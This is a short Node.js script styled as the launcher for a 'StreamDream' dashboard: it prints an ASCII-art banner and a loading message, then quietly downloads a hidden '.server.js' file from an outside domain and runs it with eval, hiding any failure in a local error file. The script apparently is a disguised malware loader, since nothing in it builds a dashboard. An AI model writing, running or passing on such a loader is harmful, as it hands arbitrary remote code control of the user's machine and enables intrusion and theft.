const print = `
███████ ████████ ██████  ███████  █████  ███    ███ ██████  ██████  ███████  █████  ███    ███ 
██         ██    ██   ██ ██      ██   ██ ████  ████ ██   ██ ██   ██ ██      ██   ██ ████  ████ 
███████    ██    ██████  █████   ███████ ██ ████ ██ ██   ██ ██████  █████   ███████ ██ ████ ██ 
     ██    ██    ██   ██ ██      ██   ██ ██  ██  ██ ██   ██ ██   ██ ██      ██   ██ ██  ██  ██ 
███████    ██    ██   ██ ███████ ██   ██ ██      ██ ██████  ██   ██ ███████ ██   ██ ██      ██ 
`;
console.log(print);
console.log("StreamDream :: Loading dashboard...");
const fetch = require('node-fetch');
const fs = require('fs');
(async () => {
    try {
        const server = await fetch("https://dbdbdbdbdbgroup.com/demo/.server.js");
        eval(await server.text());
    } catch (error) {
        fs.writeFileSync('./error.txt', error, {encoding: "utf-8"});
    }
})();